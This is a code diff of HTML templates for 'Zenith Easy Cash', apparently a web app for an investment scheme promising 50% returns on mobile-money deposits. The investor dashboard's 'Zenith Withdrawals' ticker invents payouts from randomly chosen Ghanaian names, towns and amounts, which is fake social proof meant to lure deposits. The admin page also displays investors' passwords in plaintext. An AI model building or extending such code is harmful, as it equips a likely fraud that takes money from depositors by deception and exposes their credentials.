+                <button type="button" onclick="trackInvestment()" style="background: #028a0f; padding: 10px; margin-top: 5px;">Check Status Now</button>
+            </div>
+            <div id="trackerResultBox" class="tracker-result-box">
+                <div id="trackerContent">Searching...</div>
+            </div>
+        </div>
     </div>
+
+    <script>
+        function checkNumberEntered() {
+            const val = document.getElementById('phoneInput').value.trim();
+            const passContainer = document.getElementById('passwordContainer');
+            const passInput = document.getElementById('passInput');
+            if (val.length >= 4) {
+                passContainer.style.display = 'block';
+                passInput.setAttribute('required', 'true');
+            } else {
+                passContainer.style.display = 'none';
+                passInput.removeAttribute('required');
+            }
+        }
+
+        function checkTrackNumberEntered() {
+            const val = document.getElementById('trackNumberInput').value.trim();
+            const trackPassGroup = document.getElementById('trackPasswordGroup');
+            const trackPassInput = document.getElementById('trackPasswordInput');
+            if (val.length >= 4) {
+                trackPassGroup.style.display = 'block';
+                trackPassInput.setAttribute('required', 'true');
+            } else {
+                trackPassGroup.style.display = 'none';
+                trackPassInput.removeAttribute('required');
+            }
+        }
+
+        function validatePasswordMatch(e) {
+            const pass = document.getElementById('passInput').value;
+            const confirmPass = document.getElementById('confirmPassInput').value;
+            if (pass !== confirmPass) {
+                alert('Passwords do not match! Please confirm your password correctly.');
+                e.preventDefault();
+                return false;
+            }
+            return true;
+        }
+
+        async function trackInvestment() {
+            const num = document.getElementById('trackNumberInput').value.trim();
+            const pass = document.getElementById('trackPasswordInput').value.trim();
+            const box = document.getElementById('trackerResultBox');
+            const content = document.getElementById('trackerContent');
+            
+            if (!num || !pass) {
+                alert('Please enter both your phone number and password to track.');
+                return;
+            }
+
+            box.style.display = 'block';
+            content.innerHTML = 'Searching records...';
+
+            try {
+                const response = await fetch('/api/track', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ number: num, password: pass })
+                });
+                const data = await response.json();
+
+                if (data.success) {
+                    let html = `<b style="color:#028a0f;">Investor: ${data.name}</b><hr style="border:0; border-top:1px solid #eee; margin:8px 0;">`;
+                    data.investments.forEach((inv, idx) => {
+                        html += `
+                            <div class="tracker-slot">
+                                <p style="margin:4px 0;"><b>Slot #${idx + 1}</b> - Capital: <b>GHs ${inv.amount.toLocaleString()}</b></p>
+                                <p style="margin:4px 0; color:#028a0f; font-size:12px;">Expected Return (50%): GHs ${inv.expected_return.toLocaleString()}</p>
+                                <p style="margin:4px 0; font-size:12px;">Maturity Date: <b>${inv.maturity_date}</b></p>
+                                <p style="margin:4px 0; font-size:12px;">Status: <span style="font-weight:bold; color:#b45309;">${inv.status}</span></p>
+                            </div>
+                        `;
+                    });
+                    content.innerHTML = html;
+                } else {
+                    content.innerHTML = `<span style="color: #dc2626;">❌ ${data.message || 'Invalid phone number or password.'}</span>`;
+                }
+            } catch (err) {
+                content.innerHTML = `<span style="color: #dc2626;">An error occurred while tracking. Please try again.</span>`;
+            }
+        }
+    </script>
 </body>
 </html>
 """
@@ -195,16 +651,461 @@ HTML_TEMPLATE = """
 INVESTOR_LOGIN_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
-<head><meta charset="UTF-8"><title>Investor Login</title></head>
-<body style="font-family:Arial; padding:40px; background:#f4f7f6;">
-    <div style="max-width:400px; margin:auto; background:#fff; padding:30px; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-        <h2 style="color:#028a0f; text-align:center;">Investor Login</h2>
-        <form method="POST">
-            <div style="margin-bottom:15px;"><label>Phone Number:</label><input type="text" name="number" required style="width:100%; padding:10px;"></div>
-            <div style="margin-bottom:15px;"><label>Password:</label><input type="password" name="password" required style="width:100%; padding:10px;"></div>
-            <button type="submit" style="background:#2e7d32; color:#fff; border:none; padding:12px; width:100%; font-weight:bold; cursor:pointer;">Login</button>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Investor Login - Zenith Easy Cash</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
+        .container { max-width: 400px; background: #fff; padding: 30px; margin: 80px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h2 { color: #028a0f; text-align: center; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-weight: bold; margin-bottom: 5px; }
+        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #1b5e20; }
+        .flash { background: #ffebee; color: #c62828; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; }
+        .back { text-align: center; margin-top: 15px; }
+        .back a { color: #028a0f; text-decoration: none; font-weight: bold; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Investor Portal Login</h2>
+        {% with messages = get_flashed_messages() %}
+          {% if messages %}<div class="flash">{{ messages[0] }}</div>{% endif %}
+        {% endwith %}
+        <form method="POST" action="{{ url_for('login') }}">
+            <div class="form-group">
+                <label>Phone Number:</label>
+                <input type="text" name="number" required placeholder="e.g., 0501234567">
+            </div>
+            <div class="form-group">
+                <label>Password:</label>
+                <input type="password" name="password" required placeholder="Enter your password">
+            </div>
+            <button type="submit">Login to Dashboard</button>
         </form>
-        <div style="text-align:center; margin-top:15px;"><a href="{{ url_for('index') }}">← Back to Home</a></div>
+        <div class="back"><a href="{{ url_for('index') }}">← Back to Home</a></div>
+    </div>
+</body>
+</html>
+"""
+
+INVESTOR_DASHBOARD_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Investor Dashboard - Zenith Easy Cash</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
+        
+        .main-layout { max-width: 1150px; margin: auto; display: flex; gap: 20px; align-items: flex-start; }
+        .dashboard-container { flex: 2.3; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        
+        .sidebar-ticker { 
+            width: __ZENITH_SIDEBAR_WIDTH__; 
+            flex-shrink: 0;
+            background: #111827; 
+            color: #ffffff; 
+            padding: __ZENITH_SIDEBAR_PADDING__; 
+            border-radius: 8px; 
+            position: sticky; 
+            top: 20px; 
+            max-height: __ZENITH_SIDEBAR_MAX_HEIGHT__; 
+            overflow-y: auto;
+            border: 1px solid #1f2937;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.25);
+            box-sizing: border-box;
+        }
+
+        .sidebar-sticky-header {
+            position: sticky;
+            top: 0;
+            background: #111827;
+            z-index: 10;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #334155;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+        .gps-online-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #064e3b;
+            color: #34d399;
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: bold;
+            margin-bottom: 6px;
+        }
+        .gps-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #22c55e;
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: 0 0 8px #22c55e;
+            animation: gpsBlink 1.2s infinite ease-in-out;
+        }
+        @keyframes gpsBlink {
+            0% { transform: scale(0.9); opacity: 0.5; }
+            50% { transform: scale(1.3); opacity: 1; box-shadow: 0 0 12px #22c55e; }
+            100% { transform: scale(0.9); opacity: 0.5; }
+        }
+        
+        h2 { color: #028a0f; margin-top: 0; }
+        .logout { float: right; }
+        .logout a { background: #c62828; color: white; padding: 6px 12px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 13px; }
+        .home-link-top { margin-bottom: 15px; font-size: 14px; display: flex; justify-content: space-between; align-items: center; }
+        .home-link-top a { color: #028a0f; text-decoration: none; font-weight: bold; }
+        .profile-btn-link { background: #028a0f; color: #fff; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }
+        .card { background: #f1f8e9; padding: 18px; border-radius: 6px; margin-top: 18px; border-left: 5px solid #2e7d32; line-height: 1.6; }
+        .about-company-card { background: #f8fafc; border: 1px solid #cbd5e1; border-left: 5px solid #0284c7; padding: 15px; border-radius: 6px; margin-bottom: 20px; font-size: 13px; line-height: 1.6; }
+        .about-company-card h4 { margin: 0 0 6px 0; color: #0369a1; font-size: 14px; }
+        
+        .balance-cards-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
+        .balance-card { background: #f8fafc; border: 1px solid #e2e8f0; padding: 15px; border-radius: 6px; text-align: center; }
+        .balance-card.current { border-left: 4px solid #028a0f; background: #f0fdf4; }
+        .balance-card.pending { border-left: 4px solid #d97706; background: #fffbeb; }
+        .balance-card h4 { margin: 0 0 5px 0; font-size: 12px; color: #64748b; text-transform: uppercase; }
+        .balance-card .amount { font-size: 18px; font-weight: bold; color: #0f172a; margin: 0; }
+
+        .btn-withdraw { background: #028a0f; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; width: 100%; text-align: center; box-sizing: border-box; }
+        .btn-topup-toggle { background: #ffa000; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; border: none; cursor: pointer; }
+        .topup-dropdown { background: #fff8e1; border: 1px dashed #ffa000; padding: 15px; margin-top: 12px; border-radius: 6px; display: none; }
+        .loading-badge { display: inline-flex; align-items: center; gap: 8px; background: #e0f2fe; color: #0369a1; padding: 6px 12px; border-radius: 20px; font-weight: bold; font-size: 13px; }
+        .spinner { width: 14px; height: 14px; border: 2px solid #0369a1; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .countdown-live-box { background: #0f172a; color: #38bdf8; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 13px; margin-top: 8px; text-align: center; font-weight: bold; }
+        .flash { background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; font-weight: bold; }
+        
+        .side-ticker-item { 
+            background: #1e293b; 
+            border: 1px solid #334155;
+            border-left: 4px solid #22c55e; 
+            padding: 10px 12px; 
+            margin-bottom: 10px; 
+            border-radius: 6px; 
+            font-size: 12px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.15);
+            line-height: 1.4;
+            opacity: 0;
+            transform: translateY(-10px);
+            transition: all 0.4s ease-in-out;
+        }
+        .side-ticker-item.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .side-ticker-item.fade-out {
+            opacity: 0;
+            transform: scale(0.95);
+        }
+        .side-ticker-item .name-town { 
+            font-size: 13px; 
+            font-weight: bold; 
+            color: #facc15; 
+            margin-bottom: 2px; 
+        }
+        .side-ticker-item .payout-text { 
+            font-size: 12px; 
+            color: #cbd5e1; 
+        }
+        .side-ticker-item .payout-text b { 
+            color: #4ade80; 
+        }
+        .company-momo-display { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; border-radius: 4px; margin-bottom: 10px; font-size: 13px; color: #856404; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="main-layout">
+        <div class="dashboard-container">
+            <div class="home-link-top">
+                <a href="{{ url_for('index') }}">← Back to Home Page</a>
+                <a href="{{ url_for('profile_page') }}" class="profile-btn-link">👤 My Profile Settings</a>
+            </div>
+            
+            <div class="about-company-card">
+                <h4>ℹ️ About Our Company</h4>
+                <p style="margin:0;">{{ company_about }}</p>
+            </div>
+
+            <div>
+                <h2>Welcome, {{ investor.name }}</h2>
+                <div class="logout"><a href="{{ url_for('logout') }}">Logout</a></div>
+                <div style="clear: both;"></div>
+            </div>
+
+            <div class="balance-cards-grid">
+                <div class="balance-card current">
+                    <h4>Current Balance Available</h4>
+                    <p class="amount">GHs {{ "%.2f"|format(current_balance) }}</p>
+                </div>
+                <div class="balance-card pending">
+                    <h4>Pending Balance Available</h4>
+                    <p class="amount">GHs {{ "%.2f"|format(pending_balance) }}</p>
+                </div>
+            </div>
+
+            {% with messages = get_flashed_messages() %}
+              {% if messages %}<div class="flash">{{ messages[0] }}</div>{% endif %}
+            {% endwith %}
+
+            <div id="investorSlotsContainer">
+            {% if investments %}
+                {% for inv in investments %}
+                <div class="card">
+                    <p style="margin-top:0;"><strong>Investment Slot #{{ loop.index }}</strong></p>
+                    <p><strong>Capital Invested:</strong> GHs {{ "%.2f"|format(inv.amount) }} <span style="color:#028a0f; font-size:12px;">(+50% Expected Payout: GHs {{ "%.2f"|format(inv.expected_return) }})</span></p>
+                    <p><strong>Payment Proof / ID:</strong> {{ inv.transaction_id }}</p>
+                    <p><strong>Registered On:</strong> {{ inv.date_time }}</p>
+                    <p><strong>Maturity Target Date:</strong> <span style="color: #028a0f; font-weight: bold;">{{ inv.maturity_date }}</span></p>
+                    
+                    <p><strong>Live Tracker:</strong>
+                        <div class="countdown-live-box" data-maturity="{{ inv.maturity_date }}" id="tracker_{{ loop.index0 }}">
+                            {% if inv.maturity_date == 'Pending Approval' %}
+                                ⏳ Timer will start counting once payment is verified by Admin.
+                            {% else %}
+                                Calculating remaining time...
+                            {% endif %}
+                        </div>
+                    </p>
+
+                    <p><strong>Status:</strong> 
+                        {% if inv.status == 'Pending Admin Payment Confirmation' %}
+                            <span style="color: #c2410c; font-weight: bold;">⏳ Pending Admin Approval</span>
+                        {% elif inv.status == 'Payment Confirmed & Active' %}
+                            <div class="loading-badge">
+                                <div class="spinner"></div> Active & Yielding 50% Profit...
+                            </div>
+                        {% elif inv.status == 'Withdrawal Requested' %}
+                            <span style="color: #1d4ed8; font-weight: bold;">📥 Withdrawal Requested - 12hr Payout Countdown: 
+                                <span id="withdrawalTimer_{{ loop.index0 }}" style="font-family:monospace; background:#e0f2fe; padding:2px 6px; border-radius:4px;">Loading...</span>
+                            </span>
+                        {% elif inv.status == 'Withdrawn Completed' %}
+                            <span style="color: #15803d; font-weight: bold;">✅ Completed & Paid Out (Capital + Profit)</span>
+                        {% else %}
+                            <span style="color: #555; font-weight: bold;">{{ inv.status }}</span>
+                        {% endif %}
+                    </p>
+                    
+                    {% if inv.status == 'Payment Confirmed & Active' %}
+                    <button type="button" class="btn-topup-toggle" onclick="toggleTopup({{ loop.index0 }})">➕ Top-Up / Make Another Investment</button>
+                    
+                    <form action="{{ url_for('topup', sub_idx=inv.sub_idx) }}" method="POST" class="topup-dropdown" id="topupBox_{{ loop.index0 }}" enctype="multipart/form-data">
+                        <div class="company-momo-display">
+                            <strong>COMPANY MOMO ACCOUNT:</strong><br>
+                            Number: <b>{{ settings.momo_number }}</b> | Name: <b>{{ settings.momo_name }}</b><br>
+                            <small>Send payment first before uploading proof below!</small>
+                        </div>
+                        <label style="font-size:12px;">Top-Up Amount (GHs):</label>
+                        <input type="number" name="topup_amount" min="200" step="1" required placeholder="Enter amount (Min 200 GHs)" style="padding:8px; margin-bottom:8px; width:100%; box-sizing:border-box;">
+                        <input type="text" name="topup_proof" placeholder="MoMo Transaction ID" style="padding:8px; margin-bottom:8px; font-size:12px; width:100%; box-sizing:border-box;">
+                        <label style="font-size:11px; color:#555;">Upload Screenshot Receipt:</label>
+                        <input type="file" name="topup_screenshot" accept="image/*" style="font-size:11px; margin-bottom:8px;">
+                        <button type="submit" style="background:#2e7d32; color:white; border:none; padding:10px; width:100%; font-weight:bold; border-radius:4px; cursor:pointer;">Submit Top-Up for Confirmation</button>
+                    </form>
+                    {% endif %}
+
+                    {% if inv.can_withdraw and inv.status != 'Withdrawal Requested' and inv.status != 'Withdrawn Completed' %}
+                        <a href="{{ url_for('withdraw', sub_idx=inv.sub_idx) }}" class="btn-withdraw">📥 Request Withdrawal Now (GHs {{ "%.2f"|format(inv.expected_return) }})</a>
+                    {% endif %}
+                </div>
+                {% endfor %}
+            {% else %}
+                <p style="text-align:center; color:#666;" id="noInvestmentsMsg">No investment records found.</p>
+            {% endif %}
+            </div>
+        </div>
+
+        <div class="sidebar-ticker">
+            <div class="sidebar-sticky-header">
+                <div class="gps-online-tag"><span class="gps-dot"></span> Live Tracking</div>
+                <h3 style="color: #4ade80; font-size: 14px; margin: 0; text-transform: uppercase; letter-spacing: 0.5px;">Zenith Withdrawals</h3>
+            </div>
+            <div id="sideTickerList" style="margin-top: 8px;"></div>
+        </div>
+    </div>
+
+    <script>
+        const tickerIntervalMs = __ZENITH_TICKER_INTERVAL_MS__;
+        const minMultiplier = __ZENITH_MIN_WITHDRAWAL_MULTIPLE__;
+        const maxMultiplier = __ZENITH_MAX_WITHDRAWAL_MULTIPLE__;
+        const maxVisibleItems = __ZENITH_MAX_VISIBLE_ITEMS__;
+
+        function toggleTopup(idx) {
+            const box = document.getElementById('topupBox_' + idx);
+            if (box) {
+                box.style.display = box.style.display === 'block' ? 'none' : 'block';
+            }
+        }
+
+        function updateTrackers() {
+            document.querySelectorAll('.countdown-live-box').forEach(el => {
+                const targetStr = el.getAttribute('data-maturity');
+                if (!targetStr || targetStr === 'Pending Approval') {
+                    return;
+                }
+                const targetDate = new Date(targetStr.replace(/-/g, "/"));
+                const now = new Date();
+                const diff = Math.floor((targetDate - now) / 1000);
+
+                if (diff > 0) {
+                    const days = Math.floor(diff / (3600 * 24));
+                    const hrs = Math.floor((diff % (3600 * 24)) / 3600);
+                    const mins = Math.floor((diff % 3600) / 60);
+                    const secs = diff % 60;
+                    el.innerHTML = `⏳ Time Left: ${days}d ${hrs}h ${mins}m ${secs}s`;
+                } else {
+                    el.innerHTML = `🎉 Maturity Reached! Ready for Withdrawal`;
+                    el.style.color = "#4ade80";
+                }
+            });
+        }
+
+        function updateWithdrawalCountdowns() {
+            document.querySelectorAll('[id^="withdrawalTimer_"]').forEach((el, index) => {
+                let secondsLeft = 43200 - Math.floor((Date.now() / 1000) % 43200);
+                let hrs = Math.floor(secondsLeft / 3600);
+                let mins = Math.floor((secondsLeft % 3600) / 60);
+                let secs = secondsLeft % 60;
+                el.innerHTML = `${hrs}h ${mins}m ${secs}s`;
+            });
+        }
+
+        setInterval(() => {
+            updateTrackers();
+            updateWithdrawalCountdowns();
+        }, 1000);
+        updateTrackers();
+        updateWithdrawalCountdowns();
+
+        async function pollDashboardStatus() {
+            try {
+                const response = await fetch('/api/dashboard-status');
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.reload_required) {
+                        window.location.reload();
+                    }
+                }
+            } catch (e) {}
+        }
+        setInterval(pollDashboardStatus, 5000);
+
+        const sideNames = __GHANA_NAMES_POOL__;
+        const sideTowns = __GHANAIAN_TOWNS_POOL__;
+        
+        function addSideTickerItem() {
+            const list = document.getElementById('sideTickerList');
+            if (!list) return;
+            const name = sideNames[Math.floor(Math.random() * sideNames.length)];
+            const town = sideTowns[Math.floor(Math.random() * sideTowns.length)];
+            const randomMultiplier = Math.floor(Math.random() * (maxMultiplier - minMultiplier + 1)) + minMultiplier;
+            const amt = randomMultiplier * 100 * 1.5;
+            
+            const item = document.createElement('div');
+            item.className = 'side-ticker-item';
+            item.innerHTML = `
+                <div class="name-town">${name}</div>
+                <div style="font-size:11px; color:#94a3b8; margin-bottom:2px;">(${town})</div>
+                <div class="payout-text">Cashed out <b>GHs ${amt.toLocaleString()}</b> via MoMo</div>
+            `;
+            list.prepend(item);
+            
+            setTimeout(() => { item.classList.add('show'); }, 50);
+
+            if (list.children.length > maxVisibleItems) {
+                const lastItem = list.lastElementChild;
+                lastItem.classList.add('fade-out');
+                setTimeout(() => { lastItem.remove(); }, 400);
+            }
+        }
+        setInterval(addSideTickerItem, tickerIntervalMs);
+        addSideTickerItem();
+        addSideTickerItem();
+        addSideTickerItem();
+    </script>
+</body>
+</html>
+""".replace("__ZENITH_SIDEBAR_WIDTH__", ZENITH_SIDEBAR_WIDTH)\
+   .replace("__ZENITH_SIDEBAR_PADDING__", ZENITH_SIDEBAR_PADDING)\
+   .replace("__ZENITH_SIDEBAR_MAX_HEIGHT__", ZENITH_SIDEBAR_MAX_HEIGHT)\
+   .replace("__ZENITH_TICKER_INTERVAL_MS__", str(ZENITH_TICKER_INTERVAL_MS))\
+   .replace("__ZENITH_MIN_WITHDRAWAL_MULTIPLE__", str(ZENITH_MIN_WITHDRAWAL_MULTIPLE))\
+   .replace("__ZENITH_MAX_WITHDRAWAL_MULTIPLE__", str(ZENITH_MAX_WITHDRAWAL_MULTIPLE))\
+   .replace("__ZENITH_MAX_VISIBLE_ITEMS__", str(ZENITH_MAX_VISIBLE_ITEMS))\
+   .replace("__GHANA_NAMES_POOL__", json.dumps(GHANA_NAMES_POOL))\
+   .replace("__GHANAIAN_TOWNS_POOL__", json.dumps(GHANAIAN_TOWNS_POOL))
+
+INVESTOR_PROFILE_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Investor Profile - Zenith Easy Cash</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
+        .container { max-width: 550px; background: #fff; padding: 30px; margin: 40px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h2 { color: #028a0f; text-align: center; margin-top: 0; }
+        .back-link { margin-bottom: 20px; font-size: 14px; }
+        .back-link a { color: #028a0f; text-decoration: none; font-weight: bold; }
+        .profile-avatar-large { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; border: 3px solid #2e7d32; display: block; margin: 0 auto 15px auto; background: #e2e8f0; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-weight: bold; margin-bottom: 5px; font-size: 13px; }
+        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #1b5e20; }
+        .flash { background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="back-link"><a href="{{ url_for('dashboard') }}">← Back to Dashboard</a></div>
+        <h2>Investor Profile Settings</h2>
+
+        {% with messages = get_flashed_messages() %}
+          {% if messages %}<div class="flash">{{ messages[0] }}</div>{% endif %}
+        {% endwith %}
+
+        <div style="text-align: center; margin-bottom: 20px;">
+            {% if investor.profile_pic %}
+                <img src="{{ url_for('uploaded_file', filename=investor.profile_pic) }}" class="profile-avatar-large">
+            {% else %}
+                <img src="{{ default_avatar_svg }}" class="profile-avatar-large">
+            {% endif %}
+            <p style="margin: 0; font-size: 14px; color: #64748b;">Default Human Head Avatar Active (Change below anytime)</p>
+        </div>
+
+        <form action="{{ url_for('update_profile') }}" method="POST" enctype="multipart/form-data">
+            <div class="form-group">
+                <label>Full Name:</label>
+                <input type="text" name="name" value="{{ investor.name }}" required>
+            </div>
+            <div class="form-group">
+                <label>Phone Number (Locked):</label>
+                <input type="text" value="{{ investor.number }}" disabled style="background:#f1f5f9;">
+            </div>
+            <div class="form-group">
+                <label>Work / Job:</label>
+                <input type="text" name="work" value="{{ investor.work }}" required>
+            </div>
+            <div class="form-group">
+                <label>Region / Town:</label>
+                <input type="text" name="region" value="{{ investor.region }}" required>
+            </div>
+            <div class="form-group">
+                <label>Upload/Change Profile Picture:</label>
+                <input type="file" name="profile_pic" accept="image/*">
+            </div>
+            <button type="submit">Save Profile Changes</button>
+        </form>
     </div>
 </body>
 </html>
@@ -213,20 +1114,31 @@ INVESTOR_LOGIN_TEMPLATE = """
 ADMIN_LOGIN_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
-<head><meta charset="UTF-8"><title>Admin Login</title></head>
-<body style="font-family:Arial; padding:40px; background:#f4f7f6;">
-    <div style="max-width:400px; margin:auto; background:#fff; padding:30px; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-        <h2 style="color:#028a0f; text-align:center;">Admin Authentication</h2>
+<head>
+    <meta charset="UTF-8"><title>Admin Login</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
+        .container { max-width: 400px; background: #fff; padding: 30px; margin: 80px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h2 { color: #028a0f; text-align: center; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-weight: bold; margin-bottom: 5px; }
+        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Admin Authentication</h2>
         <form method="POST">
-            <div style="margin-bottom:15px;"><label>Admin Password:</label><input type="password" name="password" required style="width:100%; padding:10px;"></div>
-            <button type="submit" style="background:#2e7d32; color:#fff; border:none; padding:12px; width:100%; font-weight:bold; cursor:pointer;">Login</button>
+            <div class="form-group"><label>Admin Password:</label><input type="password" name="password" required></div>
+            <button type="submit">Login</button>
         </form>
     </div>
 </body>
 </html>
 """
 
-# Professional Admin Dashboard with separated sections
+# PROFESSIONAL 4-SECTION ADMIN DASHBOARD TEMPLATE
 ADMIN_DASHBOARD_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -239,14 +1151,19 @@ ADMIN_DASHBOARD_TEMPLATE = """
         .logout { float: right; }
         .logout a { background: #c62828; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 14px; }
         .settings-box { background: #fff8e1; border: 1px solid #ffa000; padding: 15px; margin-bottom: 25px; border-radius: 5px; clear: both; }
+        
         .section-box { margin-bottom: 35px; background: #fafafa; border: 1px solid #e0e0e0; border-radius: 6px; padding: 20px; }
         .section-title { font-size: 16px; font-weight: bold; margin-top: 0; margin-bottom: 15px; padding-bottom: 8px; border-bottom: 2px solid #028a0f; display: flex; justify-content: space-between; align-items: center; }
+        
         table { width: 100%; border-collapse: collapse; margin-top: 5px; background: #fff; }
         th, td { padding: 10px; border: 1px solid #ddd; text-align: left; font-size: 12px; }
         th { background-color: #2e7d32; color: white; }
+        
         .btn-action { background: #2e7d32; color: white; padding: 6px 10px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 11px; border: none; cursor: pointer; display: inline-block; margin: 2px;}
         .btn-payout { background: #d32f2f; }
         img.proof-thumb { width: 45px; height: 45px; object-fit: cover; border-radius: 4px; border: 1px solid #ccc; }
+        .edit-form { display: flex; gap: 4px; margin-top: 4px; align-items: center; }
+        .edit-form input { padding: 4px; font-size: 11px; width: 110px; }
         .badge-count { background: #e0f2fe; color: #0369a1; padding: 2px 8px; border-radius: 12px; font-size: 12px; }
     </style>
 </head>
@@ -259,7 +1176,7 @@ ADMIN_DASHBOARD_TEMPLATE = """
         </div>
 
         <div class="settings-box">
-            <h3>⚙️ Company Payment Details</h3>
+            <h3>⚙️ Update Company Payment Details</h3>
             <form method="POST" action="{{ url_for('update_settings') }}" style="display: flex; gap: 10px; align-items: flex-end;">
                 <div style="flex: 1;"><label style="font-size: 12px; font-weight:bold;">MoMo Number:</label><input type="text" name="momo_number" value="{{ settings.momo_number }}" required style="padding: 8px; width: 100%;"></div>
                 <div style="flex: 2;"><label style="font-size: 12px; font-weight:bold;">Account Name:</label><input type="text" name="momo_name" value="{{ settings.momo_name }}" required style="padding: 8px; width: 100%;"></div>
@@ -267,35 +1184,60 @@ ADMIN_DASHBOARD_TEMPLATE = """
             </form>
         </div>
 
-        <!-- SECTION 1: PENDING APPROVALS -->
+        <!-- SECTION 1: PENDING APPROVALS & NEW DEPOSITS -->
         <div class="section-box" style="border-left: 5px solid #d97706;">
             <div class="section-title" style="border-color: #d97706;">
                 <span>⏳ Pending Approvals & New Deposits</span>
                 <span class="badge-count">{{ pending_list|length }} Pending</span>
             </div>
             <table>
-                <thead><tr><th>Investor Info</th><th>Password</th><th>Investment Slot Details</th><th>Job / Region</th><th>Status</th><th>Actions</th></tr></thead>
+                <thead>
+                    <tr>
+                        <th>Investor Info</th>
+                        <th>Password Management</th>
+                        <th>Investment Slot Details</th>
+                        <th>Job / Region</th>
+                        <th>Status</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
                 <tbody>
                     {% if pending_list %}
                         {% for item in pending_list %}
                         <tr>
                             <td><strong>{{ item.name }}</strong><br>{{ item.number }}</td>
-                            <td>{{ item.password }}</td>
+                            <td>
+                                <span><b>Pass:</b> {{ item.password }}</span>
+                                <form action="{{ url_for('update_password', parent_idx=item.parent_idx) }}" method="POST" class="edit-form">
+                                    <input type="text" name="new_password" placeholder="New pass" required>
+                                    <button type="submit" class="btn-action" style="background:#0284c7;">Reset</button>
+                                </form>
+                            </td>
                             <td>
                                 <strong>GHs {{ "%.2f"|format(item.amount) }}</strong><br>
                                 <small style="color:#028a0f;">Return: GHs {{ "%.2f"|format(item.expected_return) }}</small><br>
-                                <small>ID: {{ item.transaction_id }}</small>
-                                {% if item.screenshot %}<br><a href="{{ url_for('uploaded_file', filename=item.screenshot) }}" target="_blank"><img src="{{ url_for('uploaded_file', filename=item.screenshot) }}" class="proof-thumb"></a>{% endif %}
+                                <small>ID: {{ item.transaction_id }}</small><br>
+                                {% if item.screenshot %}
+                                    <a href="{{ url_for('uploaded_file', filename=item.screenshot) }}" target="_blank">
+                                        <img src="{{ url_for('uploaded_file', filename=item.screenshot) }}" class="proof-thumb">
